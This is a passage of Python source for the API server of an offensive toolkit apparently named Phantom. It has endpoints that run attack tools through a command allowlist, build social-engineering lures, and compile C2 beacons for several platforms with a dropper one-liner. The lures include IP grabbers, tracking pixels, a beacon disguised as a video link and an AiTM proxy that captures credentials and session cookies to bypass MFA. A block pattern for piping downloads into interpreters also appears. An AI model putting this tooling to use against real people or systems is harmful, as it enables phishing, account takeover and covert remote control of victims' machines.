    "exploit": ("phantom.modules.exploit", "ExploitModule"),
    "payload": ("phantom.modules.payload", "PayloadModule"),
    "handler": ("phantom.modules.handler", "HandlerModule"),
    "pivot": ("phantom.modules.pivot", "PivotModule"),
    "analyzer": ("phantom.modules.analyzer", "AnalyzerModule"),
    "wordlist": ("phantom.modules.wordlist", "WordlistModule"),
}


def _api_target_type() -> str:
    """Target-type tag (IP/EMAIL/USERNAME/DOMAIN/...) for reports/UI."""
    if not session.target:
        return "UNKNOWN"
    try:
        from phantom.automation.guidance.targets import classify_target
        return classify_target(session.target).upper()
    except Exception:
        return "UNKNOWN"


def _module_instance(name: str):
    import importlib
    spec = _MODULES.get(name)
    if not spec:
        return None
    module = importlib.import_module(spec[0])
    return getattr(module, spec[1])()


def _module_groups(instance, method: str) -> dict[str, list[str]]:
    try:
        value = getattr(instance, method)()
    except (NotImplementedError, TypeError, AttributeError):
        return {}
    return {str(key): [str(command) for command in (commands or [])]
            for key, commands in (value or {}).items()}


# ── Command allowlist (API execution gate) ─────────────────────────────────
# The module endpoints execute shell commands in the operator backend. The
# frontend is NOT a security boundary: a request body can carry anything, so
# every command is validated against the set of leading binaries the modules
# themselves generate (extracted at import time) plus a curated global tool
# set. Phantom-internal shell commands (do_* methods like `fire`, `run`,
# `deploy-agent`, `ssh [user:pass]`) are NOT backend-executable: they run in
# the CLI shell, and the API rejects them with a clear message instead of
# handing them to the OS (where "run" would just fail or worse).

_GLOBAL_TOOLS = {
    # core recon / discovery
    "nmap", "masscan", "nc", "ncat", "netcat", "traceroute", "arp-scan",
    "ping", "fping", "arp", "nbtscan", "wakeonlan", "arping",
    # service enumeration
    "sslscan", "openssl", "smbclient", "enum4linux", "enum4linux-ng",
    "rpcclient", "snmpwalk", "snmpbulkwalk", "onesixtyone", "smbmap",
    "ike-scan", "crackmapexec", "netexec", "evil-winrm", "rdesktop",
    "ldapsearch", "wbinfo",
    # web
    "curl", "wget", "whatweb", "wafw00f", "nuclei", "gobuster",
    "feroxbuster", "dirb", "nikto", "wfuzz", "ffuf", "wpscan",
    "dnsrecon", "sublist3r", "amass", "httpx", "hakrawler", "katana",
    "jsbeautifier", "xsstrike", "arjun",
    # dns
    "dig", "host", "nslookup", "whois", "dnsenum", "fierce",
    # creds / brute force
    "hydra", "medusa", "patator", "john", "hashcat", "cewl", "crunch",
    "sshpass", "ssh", "scp", "wpscan",
    # osint
    "theHarvester", "sherlock", "shodan", "exiftool", "steghide",
    "binwalk", "strings", "file", "unzip", "tar", "7z", "rar",
    "gzip", "zip", "base64",
    # exploit frameworks / tools
    "msfconsole", "msfvenom", "searchsploit", "sqlmap", "responder",
    "impacket-secretsdump", "secretsdump.py", "impacket-GetNPUsers",
    "GetNPUsers.py", "impacket-GetUserSPNs", "GetUserSPNs.py",
    "impacket-psexec", "psexec.py", "impacket-smbexec", "smbexec.py",
    "impacket-wmiexec", "wmiexec.py", "impacket-ntlmrelayx",
    "ntlmrelayx.py", "impacket-mssqlclient", "mssqlclient.py",
    "kerbrute", "bloodhound-python", "bloodhound", "cyberchef",
    # wifi
    "airmon-ng", "airodump-ng", "aireplay-ng", "reaver", "wash",
    "wifite", "bully",
    # pivot / tunneling / shells
    "proxychains", "proxychains4", "socat", "chisel", "sshuttle",
    "nc.traditional", "busybox",
    # generic utilities (interpreters are intentionally EXCLUDED: a leading
    # `bash`/`python` would be arbitrary code execution, not a module action)
    "git", "ls", "cat", "grep", "sed", "awk", "sort", "uniq", "head",
    "tail", "wc", "date", "id", "hostname", "uname", "whoami", "ps",
    "kill",
}

_MODULE_INTERNAL: dict[str, set[str]] = {}
_MODULE_TOOLS: dict[str, set[str]] = {}
_ALLOWED_TOOLS: set[str] = set(_GLOBAL_TOOLS)


def _strip_comment(cmd: str) -> str:
    """Module commands carry `  # reason` comments — drop them before
    parsing so the comment never becomes part of the token stream."""
    return re.sub(r"\s+#.*$", "", cmd).strip()


def _leading_token(cmd: str) -> str:
    """First binary of a shell command, `sudo` peeled off:
    'sudo nmap -sV {t}' -> 'nmap'; 'msfconsole -q -x "..."' -> 'msfconsole'."""
    try:
        tokens = shlex.split(_strip_comment(cmd))
    except ValueError:
        # unbalanced quotes: not a valid shell command, refuse it
        return ""
    if not tokens:
        return ""
    tok = tokens[0]
    if tok == "sudo" and len(tokens) > 1:
        tok = tokens[1]
    return tok


def _build_allowlists() -> None:
    """Extract per-module internal commands (do_*) and leading binaries from
    the same command groups the frontend receives, so anything the UI can
    legitimately send is allowed and everything else is refused."""
    global _ALLOWED_TOOLS
    for name in _MODULES:
        instance = _module_instance(name)
        internal = {m[3:] for m in dir(instance)
                    if m.startswith("do_") and m != "do_"}
        _MODULE_INTERNAL[name] = internal
        tools: set[str] = set()
        for group, cmds in {**_module_groups(instance, "build_commands"),
                            **_module_groups(instance, "suggest_commands")}.items():
            for c in cmds:
                tok = _leading_token(c)
                if not tok:
                    continue
                # Phantom pseudo-commands advertised in the module panels
                # ("run", "fire <cve>", "deploy-agent"...) are NOT shell
                # binaries: keep them out of the tool set so they cannot be
                # mistaken for a real executable by the validation gate.
                if tok.replace("-", "_") in internal:
                    continue
                tools.add(tok)
        _MODULE_TOOLS[name] = tools
        _ALLOWED_TOOLS |= tools


_build_allowlists()


def _validate_backend_command(module: Optional[str],
                              command: str) -> Optional[str]:
    """Return an error string when the command must NOT execute, else None.
    module=None applies the GLOBAL allowlist only (generic /api/backend/run)."""
    cmd = (command or "").strip()
    if not cmd:
        return "empty command"
    # `curl ... | sh` / `... | python -` is arbitrary code execution even
    # when the leading binary is allowlisted — reject pipes into
    # interpreters outright (modules never generate those).
    if re.search(r"\|\s*(?:sh|bash|zsh|dash|python|python3|perl|ruby|node|php)\b",
                 cmd):
        return ("command pipes into an interpreter (arbitrary execution) "
                "— not allowed")
    tok = _leading_token(cmd)
    if not tok:
        return "unparseable command (check quotes)"
    if module is not None:
        # 1) real shell binaries win (a do_* method may share its name with
        #    a tool the module also invokes as a command, e.g. whatweb)
        if tok in _MODULE_TOOLS.get(module, set()) or tok in _ALLOWED_TOOLS:
            return None
        internal = _MODULE_INTERNAL.get(module, set())
        if tok in internal or tok.replace("-", "_") in internal:
            return (f"'{tok}' is a Phantom shell command (CLI-only) — run it "
                    f"in the Phantom shell with 'use {module}', not through "
                    f"the API backend")
        return f"command '{tok}' is not allowed for module '{module}'"
    if tok in _ALLOWED_TOOLS:
        return None
    return f"command '{tok}' is not in the API allowlist"


@routes.get("/api/modules")
async def modules_list(_request: web.Request) -> web.Response:
    """Return module metadata and live state-aware commands."""
    payload = []
    for name in _MODULES:
        instance = _module_instance(name)
        payload.append({
            "id": name,
            "label": name.upper(),
            "suggestions": _module_groups(instance, "suggest_commands") if instance else {},
            "commands": _module_groups(instance, "build_commands") if instance else {},
        })
    return _json({"modules": payload})


@routes.get("/api/modules/{module_name}")
async def module_detail(request: web.Request) -> web.Response:
    name = request.match_info["module_name"].lower()
    if name not in _MODULES:
        return _error(f"Unknown module: {name}", 404)
    instance = _module_instance(name)
    return _json({"id": name, "suggestions": _module_groups(instance, "suggest_commands"),
                  "commands": _module_groups(instance, "build_commands")})


@routes.post("/api/modules/{module_name}/run")
async def module_run(request: web.Request) -> web.Response:
    name = request.match_info["module_name"].lower()
    if name not in _MODULES:
        return _error(f"Unknown module: {name}", 404)
    body = await request.json() or {}
    command = str(body.get("command", "")).strip()
    if not command:
        return _error("Missing command")
    gate = _validate_backend_command(name, command)
    if gate:
        return _error(gate, 403)
    result = backend_dispatcher.run(command, str(body.get("target", session.target or "")),
                                    max(1.0, min(float(body.get("timeout", 120)), 3600.0)))
    return _json({"module": name, "command": result.cmd, "stdout": result.stdout,
                  "stderr": result.stderr, "combined": result.combined,
                  "returncode": result.returncode, "timed_out": result.timed_out,
                  "error": result.error, "duration": result.duration})


@routes.post("/api/modules/{module_name}/run-group")
async def module_run_group(request: web.Request) -> web.Response:
    """Run a group of commands sequentially through the backend.

    Mirror of the CLI `run-group <name>`: each command runs in order,
    the next one starts after the previous finishes. Results are
    accumulated so the UI can show progress in real time.
    """
    name = request.match_info["module_name"].lower()
    if name not in _MODULES:
        return _error(f"Unknown module: {name}", 404)
    body = await request.json() or {}
    commands: list[str] = [
        str(c).strip() for c in (body.get("commands") or [])
    ]
    commands = [c for c in commands if c]
    if not commands:
        return _error("Missing 'commands' list")
    for c in commands:
        gate = _validate_backend_command(name, c)
        if gate:
            return _error(gate, 403)
    target = str(body.get("target", session.target or ""))
    timeout = max(1.0, min(float(body.get("timeout", 300)), 7200.0))

    results: list[dict] = []
    total_started = time.time()
    for i, cmd in enumerate(commands):
        step_start = time.time()
        result = backend_dispatcher.run(cmd, target, timeout)
        results.append({
            "index": i,
            "command": result.cmd,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "combined": result.combined,
            "returncode": result.returncode,
            "timed_out": result.timed_out,
            "error": result.error,
            "duration": result.duration,
        })
        # Stop early on fatal errors (scope block / unsafe target)
        if result.error and result.returncode == -1:
            break

    return _json({
        "module": name,
        "results": results,
        "total": len(commands),
        "completed": len(results),
        "total_duration": time.time() - total_started,
    })


# ── Reports ────────────────────────────────────────────────────────────────

@routes.post("/api/reports/generate")
async def reports_generate(request: web.Request) -> web.Response:
    """Generate a report from session data."""
    body = await request.json() or {}
    fmt = body.get("format", "html")

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    target = session.target or "unknown"
    mode = _api_target_type()
    scope = ", ".join(session.scope) if session.scope else "—"

    # Build the raw report
    raw = f"""╔══════════════════════════════════════════════════════════╗
║  PHANTOM — RAW AUDIT REPORT                              ║
╚══════════════════════════════════════════════════════════╝

GENERATED:  {now}
TARGET:     {target}
TYPE:       {mode.upper()}
SCOPE:      {scope}

──────────────────────────────────────────────────────────
ENGAGEMENT SUMMARY
──────────────────────────────────────────────────────────

Results: {json.dumps(session.results, indent=2)}

Notes:
{chr(10).join(f"  • {n}" for n in session.notes) if session.notes else '  (none)'}

Command History:
{chr(10).join(f"  {i+1}. {c}" for i, c in enumerate(session.history[-50:])) if session.history else '  (none)'}

══════════════════════════════════════════════════════════
END OF RAW REPORT
"""

    # Build the client report (sanitized)
    client = f"""╔══════════════════════════════════════════════════════════╗
║  PHANTOM — SECURITY ASSESSMENT REPORT (CLIENT)           ║
╚══════════════════════════════════════════════════════════╝

Assessment Date:  {now}
Target Scope:     {scope}

──────────────────────────────────────────────────────────
EXECUTIVE SUMMARY
──────────────────────────────────────────────────────────

Phantom performed a {mode.upper()} security assessment of the
target system(s). The engagement followed industry-standard
methodology and identified potential security weaknesses.

──────────────────────────────────────────────────────────
FINDINGS
──────────────────────────────────────────────────────────

{_client_findings(session.results)}

══════════════════════════════════════════════════════════
This report contains sanitized findings for the client.
Technical details are available in the raw audit report.
END OF CLIENT REPORT
"""

    # the target may contain path-hostile characters (<script>, :/\ ...):
    # sanitize it before it becomes part of a filesystem path
    target_safe = re.sub(r"[^A-Za-z0-9._-]", "_", target)
    report_dir = os.path.join(
        sessions_dir(), f"report_{target_safe}_{int(time.time())}")
    os.makedirs(report_dir, exist_ok=True)

    if fmt == "json":
        raw_path = os.path.join(report_dir, "raw_audit.json")
        client_path = os.path.join(report_dir, "client_report.json")
        with open(raw_path, "w") as f:
            json.dump({"report": raw, "generated_at": now}, f, indent=2)
        with open(client_path, "w") as f:
            json.dump({"report": client, "generated_at": now}, f, indent=2)
    else:
        ext = "html" if fmt == "html" else "txt"
        raw_path = os.path.join(report_dir, f"raw_audit.{ext}")
        client_path = os.path.join(report_dir, f"client_report.{ext}")
        with open(raw_path, "w", encoding="utf-8") as f:
            if fmt == "html":
                # escape the report body: raw findings/history can contain
                # angle brackets from target data (HTML injection)
                f.write(f"<html><body><pre>{html.escape(raw)}</pre></body></html>")
            else:
                f.write(raw)
        with open(client_path, "w", encoding="utf-8") as f:
            if fmt == "html":
                f.write(f"<html><body><pre>{html.escape(client)}</pre></body></html>")
            else:
                f.write(client)

    return _json({
        "raw": raw[:5000],
        "client": client[:5000],
        "raw_path": raw_path,
        "client_path": client_path,
        "generated_at": now,
        "format": fmt,
    })


def _client_findings(results: dict) -> str:
    """Generate sanitized client-facing findings."""
    lines = []
    # Group hints from results into readable text
    if results.get("scan"):
        lines.append("• Network scanning identified open ports and services")
    if results.get("osint"):
        lines.append("• OSINT collection identified publicly exposed information")
    if results.get("exploit"):
        lines.append("• Vulnerability assessment identified exploitable CVEs")
    if results.get("creds"):
        lines.append("• Credential testing revealed weak authentication patterns")
    if results.get("web"):
        lines.append("• Web application testing identified configuration issues")
    if not lines:
        lines.append("• No critical findings during this assessment cycle")
    lines.append("")
    lines.append("RECOMMENDATION: Review the detailed audit report and prioritize remediation.")
    return "\n".join(lines)


@routes.post("/api/reports/export")
async def reports_export(request: web.Request) -> web.Response:
    """Trigger a file save dialog for a report."""
    body = await request.json() or {}
    path = body.get("path", "")
    if not path or not os.path.exists(path):
        return _error("Report file not found", 404)
    return _json({"status": "ready", "path": path})


# ── Backend Detection ───────────────────────────────────────────────────────

@routes.get("/api/backend/detect")
async def backend_detect(_request: web.Request) -> web.Response:
    """Detect the configured native, WSL2, or SSH execution backend."""
    return _json(backend_dispatcher.detect())


@routes.get("/api/backend/config")
async def backend_config_get(_request: web.Request) -> web.Response:
    config = backend_dispatcher.config
    return _json({"kind": config.kind, "distro": config.distro, "host": config.host,
                  "port": config.port, "user": config.user})


@routes.post("/api/backend/config")
async def backend_config_set(request: web.Request) -> web.Response:
    body = await request.json() or {}
    config = backend_dispatcher.update(body)
    return _json({"kind": config.kind, "distro": config.distro, "host": config.host,
                  "port": config.port, "user": config.user})


@routes.post("/api/backend/run")
async def backend_run(request: web.Request) -> web.Response:
    """Run one reviewed module command in the selected operator backend."""
    body = await request.json() or {}
    command = str(body.get("command", "")).strip()
    target = str(body.get("target", session.target or ""))
    timeout = max(1.0, min(float(body.get("timeout", 120)), 3600.0))
    if not command:
        return _error("Missing command")
    gate = _validate_backend_command(None, command)
    if gate:
        return _error(gate, 403)
    result = backend_dispatcher.run(command, target, timeout)
    return _json({"command": result.cmd, "stdout": result.stdout,
                  "stderr": result.stderr, "combined": result.combined,
                  "returncode": result.returncode, "timed_out": result.timed_out,
                  "error": result.error, "duration": result.duration})


# ── Craft lures (IP grabbers / pixels / AiTM relay / beacon delivery) ───────

@routes.post("/api/craft")
async def craft_lure(request: web.Request) -> web.Response:
    """Build a social lure and return it ready to paste.
    body: {type: ipgrab|reel|image|pixel|video|beacon|beacon-player|real,
           arg?, label?, platform?, skin?, inner?}
      ipgrab          plain click-tracking link
      reel  arg=<url|search-term>   video lure on a REAL video you pick
      image arg=<file|url>          zero-click image lure (IP on render)
      pixel           1x1 tracking pixel
      video           share-format video lure (engine/API use)
      beacon          one-click beacon link disguised as a reel URL
      beacon-player   upgraded: reel page plays a REAL video, play click
                      downloads the beacon (fail-soft, no C2 exposure)
      real  arg=<real-url> inner=<ipgrab|reel|beacon-player>   REAL first
                      hop: a genuine YouTube/Drive/Notion URL goes in the
                      message, the capture link goes INSIDE that content
      aitm  arg=<real-login-url>    ENTERPRISE (opt-in): reverse proxy that
                      serves the REAL login page and captures credentials
                      AND the session cookies the provider issues (beats
                      plain MFA). Needs phishing.aitm=true + a domain w/ TLS
    """
    body = await request.json() or {}
    lure_type = str(body.get("type", "")).lower()
    try:
        from phantom.modules import craft as craft_mod
        if lure_type == "ipgrab":
            out = craft_mod.craft_ipgrab(label=str(body.get("label", "phish")))
        elif lure_type == "reel":
            out = craft_mod.craft_reel(
                arg=str(body.get("arg", "")),
                platform=str(body.get("platform", "instagram")),
                label=str(body.get("label", "reel")))
        elif lure_type == "image":
            src = str(body.get("arg", "")).strip()
            if not src:
                return _error("Image lure requires arg (local path or URL)")
            out = craft_mod.craft_image(src, label=str(body.get("label", "img")))
        elif lure_type == "video":
            out = craft_mod.craft_video(
                label=str(body.get("label", "video")),
                platform=str(body.get("platform", "instagram")),
                handle=str(body.get("handle", "")))
        elif lure_type == "pixel":
            out = craft_mod.craft_pixel(label=str(body.get("label", "px")))
        elif lure_type == "beacon":
            out = craft_mod.craft_beacon(platform=str(body.get("platform", "auto")))
        elif lure_type == "beacon-player":
            out = craft_mod.craft_beacon_player(
                platform=str(body.get("platform", "auto")),
                skin=str(body.get("skin", "instagram")))
        elif lure_type == "real":
            out = craft_mod.craft_real(
                outer_url=str(body.get("arg", "")),
                inner=str(body.get("inner", "ipgrab")),
                label=str(body.get("label", "real")))
        elif lure_type == "aitm":
            out = craft_mod.craft_aitm(
                upstream=str(body.get("arg", "")),
                code=str(body.get("code", "")))
        else:
            return _error(f"Unknown craft type: {lure_type}")
        if "error" in out:
            return _error(out["error"])
        return _json(out)
    except Exception as e:
        return _error(f"craft failed: {e}")


@routes.get("/api/craft/hits")
async def craft_hits_get(request: web.Request) -> web.Response:
    """Live hits for a lure code (?code=...)."""
    code = request.query.get("code", "")
    if not code:
        return _error("Missing code")
    try:
        from phantom.modules import craft as craft_mod
        return _json(craft_mod.craft_hits(code))
    except Exception as e:
        return _error(str(e))


@routes.get("/api/craft/sessions")
async def craft_sessions_get(request: web.Request) -> web.Response:
    """Sessions captured by an AiTM mount (?code=...)."""
    code = request.query.get("code", "")
    if not code:
        return _error("Missing code")
    try:
        from phantom.modules import craft as craft_mod
        return _json(craft_mod.craft_sessions(code))
    except Exception as e:
        return _error(str(e))


# ── Network mapping ──────────────────────────────────────────────────────────

@routes.post("/api/network/scan")
async def network_scan(request: web.Request) -> web.Response:
    """Discover live hosts on the local network / a CIDR and seed the
    WorldModel so the network map and planner see them.

    The sweep runs in a thread executor: it can take seconds and must not
    block the aiohttp event loop (previously a scan froze every other API
    call, which the Session panel noticed as random hangs)."""
    body = await request.json() or {}
    target = str(body.get("target", "")).strip() or None
    try:
        from phantom.core.netmap import discover_network, seed_worldmodel
        import asyncio
        loop = asyncio.get_event_loop()
        res = await loop.run_in_executor(None, discover_network, target)
        seeded = seed_worldmodel(res.get("hosts") or [])
        return _json({"hosts": res.get("hosts") or [],
                      "method": res.get("method"),
                      "elapsed": res.get("elapsed"),
                      "seeded": seeded,
                      "topology": res.get("topology") or {}})
    except Exception as e:
        return _error(f"network scan failed: {e}")


@routes.post("/api/network/vulnerable")
async def network_vulnerable(request: web.Request) -> web.Response:
    """Rank every discovered device by reachable attack surface (quick
    TCP-connect probe of common service ports) and recommend the best
    starting target with a human reason. Runs in a thread executor so the
    probe never blocks the API."""
    try:
        from phantom.core.netmap import (
            load_discovered_hosts, recommend_starting_target)
        import asyncio
        loop = asyncio.get_event_loop()
        hosts = load_discovered_hosts()
        if not hosts:
            return _json({"ranked": [], "recommended": None,
                          "reason": "No devices discovered yet — run a "
                                     "network scan first."})
        res = await loop.run_in_executor(None, recommend_starting_target, hosts)
        return _json({"ranked": res.get("ranked") or [],
                      "recommended": res.get("recommended"),
                      "reason": res.get("reason", "")})
    except Exception as e:
        return _error(f"exposure scan failed: {e}")


@routes.post("/api/network/liveness")
async def network_liveness(_request: web.Request) -> web.Response:
    """Probe which discovered devices are CURRENTLY alive (parallel ping,
    bounded) and refresh the device store + WorldModel so the map can
    render dead hosts faded and live hosts with the red-dot badge.
    """
    try:
        from phantom.core.netmap import (
            check_hosts_alive, load_discovered_hosts, save_discovered_hosts,
            seed_worldmodel)
        import asyncio
        loop = asyncio.get_event_loop()
        hosts = load_discovered_hosts()
        if not hosts:
            return _json({"status": {}, "checked": 0})
        status = await loop.run_in_executor(None, check_hosts_alive, hosts,
                                            8.0, True)
        # persist the refreshed alive/last_seen so the map + planner agree
        save_discovered_hosts(hosts)
        seed_worldmodel(hosts, source="netmap")
        return _json({"status": status, "checked": len(status)})
    except Exception as e:
        return _error(f"liveness probe failed: {e}")


# ── Tool install (Electron preflight / CLI) ─────────────────────────────────

@routes.post("/api/backend/install-tool")
async def backend_install_tool(request: web.Request) -> web.Response:
    """Install a missing tool in the current backend environment and
    return the live output."""
    body = await request.json() or {}
    tool = str(body.get("tool", "")).strip().lower()
    if not tool:
        return _error("Missing tool")
    try:
        from phantom.core.executor import install_tool
        res = install_tool(tool)
        return _json({"ok": res.get("ok"), "tool": tool,
                      "command": res.get("command", ""),
                      "output": (res.get("output") or "")[-4000:]})
    except Exception as e:
        return _error(f"install failed: {e}")


# ── C2 Generate Beacon ──────────────────────────────────────────────────────

@routes.post("/api/c2/generate")
async def c2_generate(request: web.Request) -> web.Response:
    """Compile a beacon for the given platform."""
    body = await request.json() or {}
    platform = body.get("platform", "windows")
    if platform not in ("windows", "linux", "android", "macos"):
        return _error(f"Unknown platform: {platform}")

    try:
        import phantom
        from phantom.utils.builder import compile_beacon
        from phantom.utils.c2_crypto import write_beacon_c2_config
        # C2 endpoint: the generated beacon must check in to THIS c2 — use
        # the session's LHOST/LPORT when set, else the C2 listener endpoint.
        from phantom.utils.network import get_c2_endpoint
        lhost = str(body.get("lhost") or session.lhost or "") or get_c2_endpoint()[0]
        lport = int(body.get("lport") or session.lport or get_c2_endpoint()[1])
        pkg_root = os.path.dirname(phantom.__file__)
        beacon_dir = os.path.join(pkg_root, "payloads", "beacon")
        cfg_path = os.path.join(beacon_dir, "src", "c2_config.h")
        current = ""
        if os.path.exists(cfg_path):
            with open(cfg_path, "r", encoding="utf-8") as f:
                current = f.read()
        desired = write_beacon_c2_config(beacon_dir, host=lhost, port=lport,
                                         use_ssl=True)
        path = compile_beacon(platform, pkg_root,
                              force_rebuild=(desired != current), arch="x64",
                              host=lhost, port=lport, use_ssl=True)
        if not path:
            return _error(
                f"Build failed: toolchain not ready for {platform}. "
                "Check 'install' hints (mingw on Windows, build-essential "
                "in WSL for linux, NDK for android).", 500)
        # dropper one-liner — the exact command to run on the target to
        # fetch + inject the beacon (same one the CLI prints)
        try:
            from phantom.utils.builder import generate_dropper
            dropper = generate_dropper(platform, lhost, lport, arch="x64",
                                       use_ssl=True)
        except Exception:
            dropper = ""
        return _json({"status": "compiled", "platform": platform,
                      "path": path,
                      "size": os.path.getsize(path) if os.path.exists(path) else 0,
                      "c2": f"{lhost}:{lport}",
                      "dropper": dropper})
    except FileNotFoundError as e:
        return _error(f"Toolchain missing: {e}")
    except Exception as e:
        return _error(f"Build failed: {e}", 500)


# ── C2 Beacon Auth ──────────────────────────────────────────────────────────

@routes.get("/api/c2/beacon-auth")
async def c2_beacon_auth_list(_request: web.Request) -> web.Response:
    """Return per-beacon HMAC identity keys."""
    try:
        from phantom.utils.beacon_auth import list_identities
        identities = list_identities()
    except Exception:
        identities = []
    return _json({"identities": identities})


@routes.post("/api/c2/beacon-auth/rotate")
async def c2_beacon_auth_rotate(request: web.Request) -> web.Response:
    """Rotate the HMAC key for a specific beacon identity."""
    body = await request.json() or {}
    beacon_id = body.get("beacon_id", "")
    try:
        from phantom.utils.beacon_auth import rotate_identity
        key = rotate_identity(beacon_id) if beacon_id else rotate_identity()
        return _json({"status": "rotated", "beacon_id": beacon_id or "default", "key_hash": key[:16] + "..."})
    except Exception as e:
        return _error(str(e), 500)


@routes.post("/api/c2/beacon-auth/revoke")
async def c2_beacon_auth_revoke(request: web.Request) -> web.Response:
    """Revoke a beacon identity."""
    body = await request.json() or {}
    beacon_id = body.get("beacon_id", "")
    if not beacon_id:
        return _error("Missing beacon_id")
    try:
        from phantom.utils.beacon_auth import revoke_identity
        revoke_identity(beacon_id)
        return _json({"status": "revoked", "beacon_id": beacon_id})
    except Exception as e:
        return _error(str(e), 500)


# ── C2 Certs ────────────────────────────────────────────────────────────────

@routes.get("/api/c2/certs")
async def c2_certs_status(_request: web.Request) -> web.Response:
    """Return TLS certificate status."""
    cert_dir = certs_dir()
    files = []
    if os.path.isdir(cert_dir):
        for f in sorted(os.listdir(cert_dir)):
            fp = os.path.join(cert_dir, f)
            if os.path.isfile(fp) and f.startswith("server."):
                files.append({"name": f, "size": os.path.getsize(fp)})
    return _json({"present": certs_exist(), "dir": cert_dir, "files": files})


@routes.post("/api/c2/certs/uninstall")
async def c2_certs_uninstall(_request: web.Request) -> web.Response:
    """Remove TLS certificate pair."""
    if server_instance.thread and server_instance.thread.is_alive():
        return _error("Stop the listener first")
    import shutil
    cert_dir = certs_dir()
    if os.path.exists(cert_dir):
        shutil.rmtree(cert_dir)
    return _json({"status": "removed"})


# ── C2 Beacon Help ──────────────────────────────────────────────────────────

@routes.get("/api/c2/beacon-help")
async def c2_beacon_help(_request: web.Request) -> web.Response:
    """Return the FULL structured list of commands supported by the beacon
    agent (single source of truth shared with the CLI beacon-help)."""
    try:
        from phantom.utils.c2_helpers import beacon_command_dicts
        return _json({"commands": beacon_command_dicts()})
    except Exception as exc:
        return _error(f"beacon command catalog unavailable: {exc}", 500)


# ── Session Wordlists ───────────────────────────────────────────────────────

@routes.get("/api/session/wordlists")
async def session_wordlists(request: web.Request) -> web.Response:
    """List / search / info on wordlists."""
    action = request.query.get("action", "list")
    try:
        from phantom.utils.wordlists import WordlistManager
        mgr = WordlistManager()
        if action == "list":
            entries = mgr.list_entries()
            return _json({"wordlists": entries, "active": session.active_wordlist or ""})
        elif action == "search":
            keyword = request.query.get("keyword", "")
            results = mgr.search(keyword) if keyword else []
            return _json({"results": results, "keyword": keyword})
        else:
            return _json({"info": mgr.info(action)})
    except Exception as e:
        return _error(str(e))


@routes.post("/api/session/wordlists/generate")
async def session_wordlists_generate(request: web.Request) -> web.Response:
    """Generate a custom wordlist."""
    body = await request.json() or {}
    pattern = body.get("pattern", "aA1")
    name = body.get("name", "custom")
    min_len = body.get("min", 4)
    max_len = body.get("max", 8)
    mutate = body.get("mutate", False)
    try:
        from phantom.utils.wordlist_engine import generate_wordlist
        path = generate_wordlist(pattern=pattern, name=name, min_len=min_len,
                                 max_len=max_len, mutate=mutate)
        session.active_wordlist = path
        return _json({"status": "generated", "path": path, "pattern": pattern})
    except Exception as e:
        return _error(str(e))


@routes.post("/api/session/wordlists/use")
async def session_wordlists_use(request: web.Request) -> web.Response:
    """Set the active wordlist."""
    body = await request.json() or {}
    name = body.get("name", "")
    if not name:
        return _error("Missing wordlist name")
    try:
        from phantom.utils.wordlists import WordlistManager
        mgr = WordlistManager()
        path = mgr.resolve(name)
        session.active_wordlist = path
        return _json({"status": "active", "active_wordlist": path})
    except Exception as e:
        return _error(str(e))


# ── Session Knowledge (WorldModel) ──────────────────────────────────────────

@routes.get("/api/session/knowledge")
async def session_knowledge(_request: web.Request) -> web.Response:
    """Return the shared WorldModel state."""
    try:
        from phantom.core.knowledge import knowledge_summary, session_wm
        summary = knowledge_summary()
        wm = session_wm()
        hypotheses = [
            {"kind": h.kind, "text": h.text, "confidence": getattr(h, "confidence", None)}
            for h in wm.pending_hypotheses()
        ] if hasattr(wm, "pending_hypotheses") else []
        return _json({"summary": summary, "hypotheses": hypotheses,
                      "target": getattr(wm, "target", session.target or "")})
    except Exception as e:
        return _json({"summary": {}, "hypotheses": [], "target": session.target or ""})


@routes.post("/api/session/knowledge/reset")
async def session_knowledge_reset(_request: web.Request) -> web.Response:
    """Reset the WorldModel for a fresh target."""
    try:
        from phantom.core.knowledge import reset_wm
        reset_wm(target=session.target)
        return _json({"status": "reset"})
    except Exception as e:
        return _error(str(e))


# ── Session Next / Preflight ────────────────────────────────────────────────

@routes.post("/api/session/next")
async def session_next(_request: web.Request) -> web.Response:
    """Adaptive next step: suggest the single best module from the LIVE
    engagement (target type, findings, reasoning hypotheses) — the same
    logic the CLI `run` uses. Does NOT execute anything."""
    if not session.target:
        return _error("No target set")

    from phantom.core.shell import PhantomShell
    shell = PhantomShell()
    suggestion = shell._next_step()
    if not suggestion:
        return _json({"status": "idle", "module": "", "reason":
                      "Nothing actionable right now — try auto <target> for the full chain.",
                      "commands": []})
    module, reason = suggestion
    commands: list = []
    instance = shell._instantiate_module(module)
    if instance is not None:
        try:
            for group in (instance.suggest_commands() or {}).values():
                commands.extend(group or [])
        except Exception:
            pass
    return _json({"status": "ok", "module": module, "reason": reason,
                  "commands": commands[:8]})


_PHANTOM_SHELL_WORDS = {"sudo", "phantom"}


def _is_phantom_action(instance, token: str) -> bool:
    """True when `token` is one of the module's OWN subcommands (do_*
    handler) or a shell control word — not an external installable tool.
    Mirrors the module's dispatch: `deploy-agent` -> `do_deploy_agent`."""
    if token in _PHANTOM_SHELL_WORDS:
        return True
    # a module NAME (payload's `handler <port>` suggestion, `run scan`)
    # is a Phantom verb, never an installable package
    if token in _MODULES:
        return True
    try:
        from phantom.core.executor import _PHANTOM_COMMANDS
        if token in _PHANTOM_COMMANDS:
            return True
    except Exception:
        pass
    if instance is not None:
        try:
            method = "do_" + token.replace("-", "_").replace(" ", "_")
            if hasattr(instance, method):
                return True
        except Exception:
            pass
    return False


def _tool_in_wsl(tool: str) -> bool:
    """Windows host: a tool may live in the Kali/Ubuntu WSL toolbox even
    though it is not on the Windows PATH — then it is NOT missing."""
    if os.name != "nt":
        return False
    try:
        from phantom.automation.runtime.toolchain import _wsl_which
        return _wsl_which(tool) is not None
    except Exception:
        return False


@routes.post("/api/session/preflight")
async def session_preflight(request: web.Request) -> web.Response:
    """Check tools for a module (or the adaptive next step when omitted)."""
    import shutil as _shutil
    body = await request.json() or {}
    module_name = (body.get("module") or "").strip().lower()

    if module_name:
        names = [module_name]
    else:
        try:
            from phantom.core.shell import PhantomShell
            suggestion = PhantomShell()._next_step()
            names = [suggestion[0]] if suggestion else ["scan"]
        except Exception:
            names = ["scan"]

    missing: list[dict] = []
    for name in names:
        from phantom.core.executor import tool_install_hint
        try:
            instance = _module_instance(name)
            if instance is None:
                continue
            tools = set()
            for source in (instance.build_commands(), instance.suggest_commands()):
                for group in (source or {}).values():
                    for cmd in (group or []):
                        first = cmd.split()[0] if cmd.split() else ""
                        if first:
                            tools.add(first)
            for tool in sorted(tools):
